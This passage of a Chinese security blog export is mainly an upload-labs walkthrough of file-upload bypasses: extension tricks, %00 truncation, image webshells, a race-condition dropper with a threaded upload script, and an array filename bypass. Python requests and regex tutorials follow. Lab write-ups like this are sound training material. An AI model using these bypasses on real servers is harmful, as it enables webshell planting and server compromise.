\n\n`str_ireplace('要替换的对象','替换为','字符串')`函数\n\n\n\n由上可知，文件`没有对后缀名进行去”::DATA”处理`。\n\nphp在window的时候如果文件名+\"::DATA”处理。php在window的时候如果文件名+\"::DATA”处理。php在window的时候如果文件名+\"::DATA\"会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::DATA\"之前的文件名 他的目的就是不检查后缀名。\n\n\n\n> ps:只能是Windows系统，并且只能时php文件\n\n\n\n\n\n###### 绕过\n\n```\ninfo.php::$DATA\n```\n\n1.如图 ，在BP中修改图片马的 jpg 的后缀名，将其改为 php ，并且在后面加上 ::$DATA ;\n\n<img src=\"http://image.xpshuai.cn/20200218161807873_1645216989.png\" />\n\n2.在网页上检查图片马的执行情况时，将图片马的后缀名中 ::$DATA ，删去，便可浏览。\n\n如图，这个是没有去掉后缀时，会发生报错。（因为我们实际上传的是PHP文件，即upload文件夹中只有php文件，而不存在带有后缀 ::$DATA的文件）\n\n<img src=\"http://image.xpshuai.cn/20200218162201913_251841335.png\" />\n\n\n\n\n\n# Pass 10 - 11 （将filename拼接路径会带来极大风险）\n\n## Pass-10\n\n<img src=\"http://image.xpshuai.cn/20200218163307924_285954321.png\" />\n\n\n\n\n\n###### 绕过\n\n**构造后缀名点空绕过**\n\n`strrchr`函数 搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符\n\n如果有多个，匹配的是最后一个（前面的就会漏掉\n\n由上可知，该关进行的是现在文件末尾先去点，再去空便没有再做任何处理，因此我们可以利用这个漏洞，构造后缀名为php+点+空+点\n\nburp修改文件名`info.php. .`\n\n<img src=\"http://image.xpshuai.cn/20200218163126238_1032488863.png\" />\n\n\n\n\n\n\n\n## Pass-11\n\n> 双写绕过\n\n\n\n没有strrchr\n\n<img src=\"http://image.xpshuai.cn/20200218163843491_1975433720.png\" />\n\n\n\n\n\nstr_ireplace函数：\n\n`str_ireplace('要替换的对象','替换为','字符串')`,   他把我们的php后缀替换为空\n\n**函数缺陷：**\n\n只是执行一次/或者没采用递归过滤\n\n\n\n\n\n###### 绕过\n\n扰乱，删除里面后，外面还能组合成功后缀\n\nburp修改filename=`info.pphphp`\n\ninfo.pphphp --- > 'info.php'\n\n\n\n<img src=\"http://image.xpshuai.cn/20200218163953790_921378631.png\" />\n\n\n\n\n\n\n\n# Pass 12 - 13 将filename当做变量加入最终路径会带来极大风险\n\n## Pass - 12\n\n> GET请求，URL网页上00截断\n\n> 前提条件：php5.34以下， magic_quotes_gpc为off状态\n\n**魔术引号 magic_quotes_gpc 作用**： 对（反斜杠？，单引号，双引号，none）产生影响, 自动加上/\n\n\n\n**白名单绕过**\n\n)<img src=\"http://image.xpshuai.cn/20200218165050537_741059186.png\" />\n\nsave_path可控， `$_GET['save_path']` 通过get获取，可以把get中url参数带上00截断\n\n\n\n%00 截断（类似注释符号，后面的不再执行）\n\n> Note： %00 是URL编码后的结果， 选中，解码转换（url decode）为小方块，才是真正的%00, Hex下是00\n\n\n\n数据包中 `save_path=../upload/shell.php%00` （注意 url_decode）后面的就没用了，filename=\"shell.jpg\"\n\n\n\n由源码可知，图片的save_path通过get传递，然后和后缀ima_path直接拼接而成的，所以我们可以直接使用 %00 截断，将后缀名 .jpg 截断，从而以 php 运行\n\n\n\n\n\n###### 绕过\n\nURI中00截断\n\n\n\n**方法一：拦包00截断**\n\n由于是在get的url中，`%00`就不进行decode了，\n\n<img src=\"http://image.xpshuai.cn/20200218170335768_2032329037.png\" />\n\n\n\n上传成功：\n\n查看图片路径：\n\n<img src=\"http://image.xpshuai.cn/20200218170644694_1142415094.png\" />\n\n查看服务器保存文件：\n\n<img src=\"http://image.xpshuai.cn/20200218170437679_903547409.png\" />\n\n\n\n访问的时候，去掉后面的jpg，只访问php，OK：\n\n<img src=\"http://image.xpshuai.cn/20200218170513646_522012281.png\" />\n\n\n\n\n\n\n\n**方法二：前端直接修改为 \"php+00截断\"格式**\n\n如下可得，直接将参数save_path修改为php+00截断的格式，因此它会将之后上传的所有文件以PHP的格式进行解析。\n\nps:图片是盗取的\n\n<img src=\"http://image.xpshuai.cn/20200218170957259_1424254637.png\" />\n\n\n\nburp只修改下面的filename为`x.jpg`即可\n\n\n\n\n\n\n\n## Pass - 13\n\n> POST请求，00截断\n\n\n\n**白名单绕过**\n\n<img src=\"http://image.xpshuai.cn/20200218165118835_726563878.png\" />\n\n\n\n\n\n**F1:**\n\n同12关，只是修改的地方不同\n\n**1.**burp拦截。在post后面加上`info.php%00` (%00是url decode之后的)，再发送即可\n\n<img src=\"http://image.xpshuai.cn/20200218172018042_1656668337.png\" />\n\n\n\n**2.**burp拦截，然后在上面的upload 的后面加上 `123.php+`（这里的123可以为任何名字，他只是一个代号。并且 php后面的 `+ `好也是一个标记，他的二进制代码为 `2b`）\n\n由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 `00` .\n\n<img src=\"http://image.xpshuai.cn/20200218171415601_503298826.png\" />\n\n\n\n同样，访问的时候访问php文件：\n\n<img src=\"http://image.xpshuai.cn/20200218171807564_1778234073.png\" />\n\n\n\n\n\n\n\n**F2 意外发现：文件覆盖**\n\n<img src=\"http://image.xpshuai.cn/20200218172227317_2113414909.png\" />\n\n由于名字可以不相同，即我们可以任意定义uploads旁边的 PHP 文件名，如果将文件名改为uploads中本身存在的文件，那么新的文件将会覆盖原来的文件。\n\n<img src=\"http://image.xpshuai.cn/20200218172321670_308115506.png\" />\n\n\n\n\n\n\n\n## Pass - 20 （也是类似的，便于比较就放这里了）\n\n\n\n<img src=\"http://image.xpshuai.cn/20200218172852998_939565232.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200218172525227_655899960.png\" />\n\n这里进行过滤的是他的那个文件名，而不是我们上传文件最开始的文件名，所以要在他的文件名上做手脚\n\n\n\n`$file_ext = pathinfo($file_name,PATHINFO_EXTENSION)`   返回拓展后缀\n\n\n\n这里的文件名`filename`是可控的：  `$_POST['save_name']`\n\n\n\n###### 绕过\n\n 我们可以在save_path中加入php+00截断，由于是POST发送方式，因此我们需进行00截断。`111.php%00upload-19.jpg` （注意url decode）\n\n<img src=\"http://image.xpshuai.cn/20200218174147577_857047164.png\" />\n\n\n\n上传OK：\n\n<img src=\"http://image.xpshuai.cn/20200218174246606_1092693624.png\" />\n\n\n\n去掉00后面内容，访问php，正常解析\n\n<img src=\"http://image.xpshuai.cn/20200218174323338_682125752.png\" />\n\n\n\n\n\n\n\n# Pass14 - 17 （文件包含漏洞）\n\n## Pass - 14\n\n> 获取文件头进行了验证\n\n\n\n**图片马制作：**\n\nwin下：copy a.jpg /b + b.php /a shell.jpg\n\nLinux下：cat a.jpg b.php > shell.jpg\n\n\n\n文件包含漏洞（xx.php?file=uploads/x.jpg） 文件不限格式后缀\n\n**意义**：如果存在包含漏洞，需要上传一张图片(图片马)，就可以getshell\n\n\n\n<img src=\"http://image.xpshuai.cn/20200218175651617_999905544.png\" />\n\n\n\n`$strInfo = @unpack(\"C2chars\", $bin);`// C为无符号整数，网上搜到的都是c，为有符号整数，这样会产生负数判断不正常\n\n\n\n`$bin = fread($file, 2);` //只读2字节进行验证\n\n表示只是对文件头做了检测\n\n `$strInfo = @unpack(\"C2chars\", $bin);` 标示前两个字符按照，c格式，数组索引chars1,chars2                @unpack\n\n `$typeCode = intval($strInfo['chars1'].$strInfo['chars2']);`\n\n\n\n**文件头：** 不同后缀类型文件头部代码中有GIF89a,NG,PK,7Z， 部分验证会验证文件头\n\n> 常见文件头：https://blog.csdn.net/xiangshangbashaonian/article/details/80156865\n\n\n\n**突破：** 伪造可行的文件头\n\n\n\n###### 绕过\n\n上传图片马，上传。打开测试页面，引用刚才的图片马\n\n\n\n\n\n\n\n## Pass - 15    getimagesize\n\n<img src=\"http://image.xpshuai.cn/20200218185841047_937742626.png\" />\n\n\n\n函数拓展：`getimagesize（）`   判断是否为一个完整的图像\n\n索引2`$info[2]` 是图像的类型\n\n<img src=\"http://image.xpshuai.cn/20200218185758469_1439877358.png\" />\n\n\n\nimage_type_to_extension 获取的是MIME类型\n\n```ph\n$info = getimagesize($filename);\n\n$ext = image_type_to_extension($info[2]);  # 获取后缀jpeg  ,   $info[2] 是文件类型\n\n\nif(stripos($types,$ext)>=0)  # 是否在白名单中\n```\n\n\n\n\n\n\n\n###### 绕过\n\n上传图片马，\n\n打开测试页面，直接包含`include`file='文件.jpg', 就是当成php解析\n\n\n\n\n\n\n\n\n\n## Pass - 16   php_exif模块\n\n<img src=\"http://image.xpshuai.cn/20200218185919196_54375063.png\" />\n\n\n\n函数拓展：`exif_imagetype（）`\n\n<img src=\"http://image.xpshuai.cn/20200218190317887_1240325255.png\" />\n\n\n\nphp_exif模块来判断文件类型\n\n版本：PHP>=4.3.0,  PHP5, PHP7\n\n\n\n###### 绕过    \n\n需要开启`php_exif`模块：\n\n1.打开配置文件，php拓展，`php_exif`打开；\n\n2.配置文件在`php.ini`,分号是注释，可以直接解除注释启用,并将此行移动到extension=php_exif.dll之前，使之首先加载*。\n\n<img src=\"http://image.xpshuai.cn/20200218220405641_1769279545.png\" />\n\n\n\n\n\n上传图片马（注意MIME与后缀和文件头要一直，然后打开测试页面，包含gif，OK\n\n\n\n\n\n\n\n\n\n\n\n## Pass - 17   （图片二次编码）\n\n\n\n其实就是检测两次\n\n**本质：** 检测 MIME和后缀是否对应\n\n\n\n**原理：** 将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。\n\n具体实现需要`自己编写Python程序`，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。\n\n```\n//使用上传的图片生成新的图片\n\n $im = imagecreatefromjpeg($target_path);\n```\n\n\n\n###### 绕过  \n\n好了，还是太菜，还是看大佬的解决方案学习学习把吧:[点击这里](https://xz.aliyun.com/t/2657)\n\n**1.GIF**\n\n关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.\n\n\n\n**2.PNG**\n\npng的二次渲染的绕过并不能像gif那样简单.\n\n\n\n**3.JPG**\n\n\n\n\n\n> ps: 这一关是二次渲染的，还是多学习学习吧\n\n\n\n\n\n\n\n\n\n# 18 -19 条件竞争 （多线程发包）\n\n## Pass - 18\n\n\n\n<img src=\"http://image.xpshuai.cn/20200218222155590_1020797820.png\" />\n\n\n\n`unlink`函数：   数删除文件。若成功，则返回 true，失败则返回 false\n\n\n\n**执行步骤：**\n\n1.取出上传文件的后缀名\n\n2.临时文件移动（`move_uploaded_file`）到一个路径下面，\n\n3.如果后缀名在白名单，进行最后移动，保存\n\n4.如果后缀名不在白名单，`unlink`删除临时文件\n\n\n\n\n\n###### 绕过\n\n> 趁他不注意（多线程），在临时文件里面写一个创建后门文件的功能，这样虽然临时文件不满足被删除，但是自己自动创建的文件已经存在服务器目录了\n\n\n\n**F1：**\n\n其中，诱饵上传文件代码\n\n```php\n<?php\n\n$myfile = fopen(\"shell.php\", \"w\") or die(\"Unable to open file!\");\n\n$txt = \"<?php  phpinfo();   ?>\\n\";\n\nfwrite($myfile, $txt);\n\nfclose($myfile);\n\n?>\n```\n\n然后，如果已知新建文件的路径，可以直接访问\n\n​            如果不知道，可以抓取数据包查看\n\n\n\n**方法：**\n\n1.利用burp的Intruder使用多线程发包(如下图)，\n\n2.然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。（即当线程足够的时候 ，将可能会跳过某个步骤，而直接访问到我们的 webshell，新文件也会创建成功 )\n\n<img src=\"http://image.xpshuai.cn/20200218222719652_1510553817.png\" />\n\n\n\n\n\n**F2:**   Python\n\n```python\n\\#!/usr/bin/env python3\n\n\\# coding:utf-8\n\n\n\nimport hackhttp\n\nfrom multiprocessing.dummy import Pool as ThreadPool\n\n\n\n\n\ndef upload(lists):\n\n​    hh = hackhttp.hackhttp()\n\n​    raw = \"\"\"POST /upload-labs/Pass-17/index.php HTTP/1.1\n\nHost: 127.0.0.1\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\n\nAccept-Encoding: gzip, deflate\n\nReferer: http://127.0.0.1/upload-labs/Pass-18/index.php\n\nCookie: pass=18\n\nConnection: close\n\nUpgrade-Insecure-Requests: 1\n\nContent-Type: multipart/form-data; boundary=---------------------------6696274297634\n\nContent-Length: 341\n\n\n\n-----------------------------6696274297634\n\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"18.php\"\n\nContent-Type: application/octet-stream\n\n\n\n<?php\n\n$myfile = fopen(\"shell.php\", \"w\") or die(\"Unable to open file!\");\n\n$txt = \"<?php  phpinfo();   ?>\\n\";\n\nfwrite($myfile, $txt);\n\nfclose($myfile);\n\n?>\n\n-----------------------------6696274297634\n\nContent-Disposition: form-data; name=\"submit\"\n\n\n\n上传\n\n-----------------------------6696274297634--\n\n\"\"\"\n\n​    code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-17/index.php', raw=raw)\n\n​    print(str(code) + \"\\r\")\n\n\npool = ThreadPool(10)\n\npool.map(upload, range(10000))\n\npool.close()\n\npool.join()\n```\n\n只是把burp换成了python，其他操作方法是一样的\n\n\n\n###### 修复问题\n\n应该先判断文件类型，再移动\n\n\n\n\n\n\n\n\n\n## Pass - 19\n\n\n\n\n\n```php\nif( $this->cls_rename_file == 1 ){  //是否用$im_path成功给$upload_file重命名\n```\n\n\n\n\n\n和第18关有点类似，都对关键进行了重命名，由于我们是利用burp不断的发送相同的包，那么一旦有两个包同时传到这边是，那么系统对一个重命名时，另一个刚好“逃脱”了，那么上传成功。\n\n\n\n\n\n###### 绕过      \n\n在这关是一个`白名单`，`利用了appche的一个解析漏洞`，它会将 “`.php.7z` 当作` .php`来解析，而刚好 “ .php.7z ”又属于白名单，\n\n所以上传一个 “ .php.7z ” 的文件，然后 再利用条件竞争漏洞进行多线程不断的发送 “ .php.7z”的文件，\n\n由于版本问题，这次的文件没有上传到upload的文件夹下面，而是上传到 WWW 的文件夹下面，但是不影响，并且这次的文件上传后就`不会被删掉`，就会保存在 该文件夹下面，这样的话我们将可以`稳定的访问到`。\n\n\n\n可以看到，burp进行多线程发包后，在浏览器一致访问上传文件的地址，一定会有那么一瞬间会访问到（这时，文件里新建webshell的代码执行了，新的后门建立成功了，我们就可以访问后门了）\n\n<img src=\"http://image.xpshuai.cn/20200218224226603_822814111.png\" />\n\n\n\n\n\n\n\n\n\n\n\n\n\n# 00截断和move_uploaded_file（）函数\n\n## Pass - 20      \n\n`pathinfo(）函数`：以数组的形式返回关于文件路径的信息。\n\npathinfo(path,options)\n\n`move_uploaded_file(A,B`)函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。\n\n\n\n###### 绕过\n\n**方法一：**  %00截断 （前面已经写了）\n\n`111.php%00upload-19.jpg`  其中，%00是url-decode之后的\n\n\n\n**方法二：** \n\n利用`move_uploaded_file（）函数和黑名单结合`存在的漏洞：\n\nmove_uploaded_file（A,B）函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；`否则将会返回false，并且不执行任何操作`。\n\n\n\n由于这里利用了黑名单，则move_uploaded_file（）函数在判断时只会判断是否为黑名单，如果不是，那么他将会直接将文件保存在指定目录下。所以在这里我们利用 `/.`(斜杠点)和 ` 空格 `（空格）进行绕过。\n\n（1） “/.”(斜杠点)\n\n​    `upload-19.php/.`\n\n\n\n（2）“ ”（空格）\n\n​    `upload-19.php `\n\n​    \n\n（3）“ .”（空格）\n\n `upload-19.php.`\n\n  `upload-19.php. `   点+空格\n\n   等等...\n\n\n\n**方法三：** \n\nWindows冒号截断\n\n```\nupload-19.php:.jpg\n```\n\n(我做的实验，php上传成功，但是内容清空了)\n\n\n\n\n\n\n\n## Pass - 21     \n\n> 参考: https://blog.csdn.net/kekefen01/article/details/90346413\n\n\n\n通过传递数组绕过。属于逻辑漏洞，没有考虑数组第二个元素不存在的情况。\n\n\n\n###### 绕过\n\n使用多个数组\n\n```\n------WebKitFormBoundaryDTdqZdRoon2GpWOE\n\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"info.php\"\n\nContent-Type: image/jpeg\n\n\n\n<?php phpinfo();?>\n\n\n\n------WebKitFormBoundaryDTdqZdRoon2GpWOE\n\nContent-Disposition: form-data; name=\"save_name[0]\"\n\n\n\ninfo.php/\n\n------WebKitFormBoundaryDTdqZdRoon2GpWOE\n\nContent-Disposition: form-data; name=\"save_name[2]\"\n\n\n\njpg\n\n------WebKitFormBoundaryDTdqZdRoon2GpWOE\n\nContent-Disposition: form-data; name=\"submit\"\n\n\n\n上传\n\n------WebKitFormBoundaryDTdqZdRoon2GpWOE--\n```\n\n最终文件名为“info.php/.” 因为move_uploaded_file底层会调用tsrm_realpath函数导致，递归删除文件名最后的/.\n\n\n\n\n\n\n\n> 参考文章：https://blog.csdn.net/weixin_43901038/article/details/94890631\n\n> https://www.cnblogs.com/shellr00t/p/6426945.html\n\n> https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/","tags":["文件上传"],"categories":["渗透测试"]},{"title":"python之requests库","url":"%2Fposts%2F659559f6%2F","content":"\nRequests是基于urllib3来改写的，采用Apache2 Licensed 来源协议的HTTP库。\n\n它`比urllib更加方便`，可以节约我们大量的工作，完全满足HTTP测试需求。\n\n\n  \n## 安装\n\n`pip install requests`\n\n\n  \n## 使用\n**测试网站**：`http://httpbin.org/`\n\n###### GET请求\n```python\nimport requests\n\n# 不带参数\nr = requests.get('http://httpbin.org/get')\nprint(r.text)\n\n# 携带参数\ndata = {\n    'name':'zhangsan',\n    'age':20,\n}\nr1 = requests.get('http://httpbin.org/get', params=data)\nr3.encoding = 'utf-8'   # 设置编码\nprint(r1.text)\n\n\n#如果是中文或者有其他特殊符号，则进行url编码\nfrom urllib.parse import urlencode\njob = \"程序员\"\nparm = urlencode(job, encoding=\"utf-8\")\n# 再进行拼接后进行后续请求...\n```\n\n\n\n###### POST请求\n\n```python\nimport requests\n\n# 不带参数\nr = requests.post('http://httpbin.org/post')\nprint(r.text)\n\n\n# 携带参数\ndata = {\n    'user': 1,\n    'pwd': 'hhh',\n    'submit': 'submit',\n}\nr1 = requests.post('http://httpbin.org/post', data=data)\n```\n\n\n\n###### 请求头\n\n```python\n\n# 自定义请求头\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36',\n}\nresponse1 = requests.get(url, headers=headers,params=data)\n\n\n# 打印请求头\nprint(response1.request.headers)\n\n# 两种遍历方式\nfor key, value in r3.headers.items():\n    print(key+\":\"+value)\nprint(\"************************************\")\nfor key in r3.headers:   # 不是请求头\n    print(key + \":\" + (r3.headers)[key])\n```\n\n\n\n\n\n###### 响应信息\n\n```python\n# 响应头\nprint(response1.headers)\n\n# 其他信息\nprint(response1.headers['Server'])\nprint(response1.url)   # 打印url\nprint(response1.status_code)   # 状态码 200\nprint(response1.cookies.items())   # cookie\nprint(response1.apparent_encoding)  # 提供的编码\nprint(response1.elapsed)  # 请求到响应的时间\nprint(r.history)    # history属性得到请求历史\n\n# cookie操作\nprint(response1.headers['Set-Cookie'])\n\nprint(response.text)    #   响应返回的数据: str\nprint(response.content)   #  响应返回的数据: 二进制形式\n\n# 对文件内容查找(比如被安全狗拦截后页面中会有关键字:`safedog`)\n...\nif response.text.find('safedor'):\n    print('被拦截')\nelse:\n    print('绕过')\n...\n    \n\n\n# 比如爬图片，音乐，视频就是用的二进制数据\nimport requests\nresponse = requests.get('http://xpshuai.cn/favicon.ico')\n# 保存图片  wb写入\nwith open('favicon.ico','wb')as f:\n    f.write(response.content)\n```\n\n\n\n###### 解析json\n\n使用json（）方法，就可以将返回结果是JSON格式的字符串转化为字典\n\n```python\nimport requests\n\nr = requests.get('http://httpbin.org/get')\nprint(r.text)\nprint(type(r.text))   # <class 'str'>\nprint(r.json())\nprint(type(r.json()))  # <class 'dict'>\n```\n\n\n\n###### SSL证书检验\n\n```python\n# 参数  verify=False时表示，对于 https 不验证证书\n \nr = requests.get(url1, verify=False)\n    \n```\n\n\n\n###### 设置代理\n\n```python\nimport requests\n\nproxies = {'http': ' http://127.0.0.1:8080', 'https': ' https://127.0.0.1:8080'}\n\nr = requests.get(url, proxies=proxies, verify=False)\n```\n\n可以设置代理池, 随机更换\n\n```python\nproxies = []\n\nrequest = requests.get(url, proxies={'http': random.choice(proxies)}, headers=head) \n\n```\n\n\n\n\n\n\n\n###### 自定义cookie\n\n```python\n#打印cookie\nfor key,value in r.cookies.items():\n    print(key + '=' + value)\n```\n\n\n\n1.简单的做法:  \n\n```python\n\nimport requests\n \nheaders = {\n    \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/\"\n                 \"537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\"\n}\n \ncookies = {\"cookie_name\": \"cookie_value\", }\nresponse = requests.get(url, headers=headers, cookies=cookies)\n\n\n```\n\n2.CookieJar\n\n更专业的方式:先实例化一个RequestCookieJar的类，然后把值set进去，最后在get,post方法里面指定cookies参数\n\n```python\n\n\nfrom http.cookiejar import CookieJar\n\n\nrequests.cookies.update()\n\nc = requests.cookies.RequestsCookieJar()\nc.set('cookie-name', 'cookie-value', path='/', domain='.abc.com')\ns.cookies.update(c)\n```\n\n3.requests.Session()方法\n\n```python\nsession = requests.Session()\nsession.cookies['cookie'] = 'cookie-value'\n\n# 功能：可以添加cookie，不会清除原cookie\n# 缺点：不能设置path，domain等参数\n```\n\n\n\n\n\n###### session\n\n**会话维持**\n\n在requests中，如果直接利用get（）或post（）等方法的确可以做到模拟网页的请求，但是这实际上是相当于不同的会话，也就是说相当于你用了两个浏览器打开了不同的页面。\n\n```python\nimport requests\n \n \nheaders = {\n    \"content-type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n    \"User-Agent\" : \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.6) \",\n}\n \n#设置一个会话session对象s\ns = requests.session()\nresp = s.get('https://www.baidu.com/s?wd=python', headers=headers)\n# 打印请求头和cookies\nprint(resp.request.headers)\nprint(resp.cookies)\n \n# 利用s再访问一次\nresp = s.get('https://www.baidu.com/s?wd=python', headers=headers)\n \n# 请求头已`保持`首次请求后产生的cookie\nprint(resp.request.headers)\n\n```\n\n\n\n\n\n###### 异常处理\n\n进行网络请求的时候，难免会出错，这时候为了程序能够继续运行下去，就要对异常进行处理\n\n```python\n# 最简单的一种\n\ntry:\n    # 请求过程\n    r = requests.get(url1, headers=headers, verify=False, params=data, cookies=cookies)\n    # ......\n    \nexcept Exception as e:\n    time.sleep(1)\n    print(e)\n    \nfinally:\n    print(\"程序执行结束!\")\n    \n```\n\n\n\n\n\n###### 文件上传\n\n```python\nimport requests\n\nfiles = {\n    'file':open('favicon.ico','rb')\n}\n\nr = requests.post('http://www.httpbin.org/post',files=files)\nprint(r.text)\n\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["requests"],"categories":["Python"]},{"title":"python正则表达式","url":"%2Fposts%2F6bab798e%2F","content":"\n\n  \n常用正则表达式来对爬取的网页进行解析，但是正则表达式的构造稍微复杂一点，一般在结构化的网页中没必要用正则（易出错）\n  \n```python\n# findall\na = re.findall('jianeng',s )  ## 搜索字符串，以列表类型返回全部能匹配的子串\nprint(a)\n\n#search()     # 在一个字符串中搜索，匹配正则表达式的第一个位置，返回match对象 <_sre.SRE_Match object; span=(1, 8), match='jianeng'> 只能找到第一次出现的\na = re.search('jianeng',s)\nprint(a)\n\n#finditer()    # 搜索字符串，返回一个匹配结果的迭代类型，\n              # 每个迭代元素是match对象\n\ns = 'sjianengsdfasjianeng15sadfjianeng666'\nfinditer = re.finditer('jianeng',s)\nprint(finditer )\n\n##获取match对象中的值\nfor i in finditer:\n    print(i)\n    print(i.group())     #froup() 返回匹配到的字符串\n    print(i.start() )    #返回匹配的开始位置\n    print(i.end() )        #返回匹配的结束位置\n    print(i.span() )      # 返回一个元组表示匹配位置（开始，结束）\n\n\n#sub()         # 替换 类似于字符串中 replace() 方法\ns2 = re.sub('jianeng','666',s,count=2)\nprint(s2)\n\n\n# compile()  \t  # 编译正则表达式为模式对象\na = re.compile('jianeng')   # a 要匹配jianeng\ndd='fsadfasfjkjianeng'\nb = a.findall(dd)\nprint(b )\n\n#re.split()    # 将一个字符串按照正则表达式匹配结果进行分割，返回列表类型\nc = re.split('jianeng',s,maxsplit=2)\nprint(c)\n\n\nimport re\n\n#####元字符\n##通配符  -> .  点 -> 表示任意一个字符\nres = re.findall(r'a','abcad')   #统一使用r取消转义  去右边字符串中找所有满足左边格式的子字符串\nprint(res)   #['a', 'a']\n\nres =  re.findall(r'a..','abcad')\nprint(res)   #['abc']\n\n##锚点元字符\n# ^ 锁定行首\nres =  re.findall(r'^a.','abcad')\nprint(res)    #['ab']\n\n# $ 锁定行尾\nres =  re.findall(r'a.$','abcad')\nprint(res)   # ['ad']\n\n##单词边界(不是元字符)：   \\b\nres =  re.findall(r'dog','Just dog Monica doggie Irene')\nprint(res)    # ['dog', 'dog']    #第二个dog不是单独的dog单词\n\nres =  re.findall(r'\\bdog\\b','Just dog Monica doggie Irene')\nprint(res)      # ['dog']\n\n\n###重复元字符\n\n####贪婪  （尽可能匹配的多）\nres =  re.findall(r'ab{4}c','abbbbc')   #连续4个b   把花括号前面紧挨着的重复多少次\nprint(res)     #['abbbbc']\n\nres =  re.findall(r'ab{2,4}c','abbbc')   #匹配2到4个b      #正则不许加空格\nprint(res)     #['abbbc']\n\nres =  re.findall(r'ab{2,}c','abbbbbbbbbc')      #匹配2的到多个，至少2个\nprint(res)       #['abbbbbbbbbc']\n\n###\nres =  re.findall(r'ab*c','abbbc')   #   * 任意多个重复, 相当于{0,}\nprint(res)\n\nres =  re.findall(r'ab+c','abbbc')   #   * 一个或多个，一到正无穷,相当于 {1,}\nprint(res)\n\nres =  re.findall(r'ab?c','abbbc')   #   *    一个或者没有 ,相当于 {0,1}\nprint(res)\n\n######非贪婪  (尽可能匹配的少)   后面加一个 ？\nres =  re.findall(r'ab*','abbc')   # 这是贪婪\nprint(res)   #['abb']\n\nres =  re.findall(r'ab*？','abbc')\nprint(res)   # 这是非贪婪\n\n# *? #任意多个\n# +? #一个或多个\n# ?? #一个或没有\n\n\n###选择元字符   |\nres =  re.findall(r'ab|bc','abc-adc-aec-bca')   #二选一   #  | 或\nprint(res)   # ['ab', 'bc']                      #选的是正则表达式\n\nres =  re.findall(r'a[bd]c','abc-adc-aec-bca')   # 多选一 ， [] 方括号 表示你想要列举的所有情况，但是,仅仅一个字符\nprint(res)   #  ['abc', 'adc']                   #选的是方括号里面的一个字符    ，  【】里面的逗号表示匹配逗号\n\nres =  re.findall(r'a[^bd]c','abc-adc-aec-bca')   #   ^在[]里面的话，放在第一位，表示反向\nprint(res)   #  除了b和d\n\nres =  re.findall(r'a[a-e]c','abc-adc-aec-bca-a^c')   #用 - 连接表示范围   [a-zA-Z0-9_]任意字母数字下划线\nprint(res)\n\n####转义元字符      匹配字符本身   \\ 反斜杠\nres =  re.findall(r'.+.','1+2')\nprint(res)   #['1+2'] 不是匹配到了加号\n\nres =  re.findall(r'1\\+2','1+2')   #得到元字符的字面值\nprint(res)  #['1+2']\n\n######预定义字符类\n# \\d  #任一数字字符   -> [0-9]\n# \\D  #任一非数字字符  -> [^0-9]\n# \\s  #任一空白符    -> [\\t\\n\\x0B\\f\\r]\n# \\S  #任一非空白符    -> [^\\t\\n\\x0B\\f\\r]\n# \\w  #任一字母数字字符  -> [a-zA-Z0-9]\n# \\W  #任一非字母数字字符  -> [^a-zA-Z0-9]\n\n\n######分组\nres =  re.findall(r'a(bc)+d','abcbcbcd')    #只能匹配一个bc  括号里面的变成一个整体     一个括号就是一个组\nprint(res)    # ['bc']\n\nres =  re.findall(r'(a(bc)+d)','abcbcbcd')    #大组套小组\nprint(res)     # [('abcbcbcd', 'bc')]\n\nres =  re.findall(r'a(b|c)c','abc-acc-adc-aec')   #与a[bc]c类似\nprint(res)     # ['b', 'c']\n\n##按组提取数据\nres =  re.findall(r'(\\w+)-(\\w+)-(\\w+)-(\\w+)','abc-dc-acc-aaec')\nprint(res)   # [('abc', 'acc', 'adc', 'aec')]\n\nres =  re.search(r'(?P<year>\\d+)-(?P<month>\\d+)-(?P<day>\\d+)','2018-03-13')\nprint(res.groupdict())    # {'year': '2018', 'month': '03', 'day': '13'}\n\n\n\"\"\"\n注意：\n如果正则表达式中使用了括号，\n那么findall函数匹配的结果\n只会是括号中的内容，\n而不是完整的匹配。\n\n因此我们可以利用这种机制来\n完整对需要部分的数据提取\n\n\"\"\"\n```\n\n\n\n","tags":["正则"],"categories":["Python"]},{"title":"中缀表达式转换为后缀表达式","url":"%2Fposts%2F94a5b228%2F","content":"\n\n  \n# 中缀表达式转换后缀表达式\n  \n#### 3.1 规则\n\n- 1、初始化栈和集合：运算符号栈s1和存储空间集合s2\n\n- 2、从左到右扫描中缀表达式\n\n- 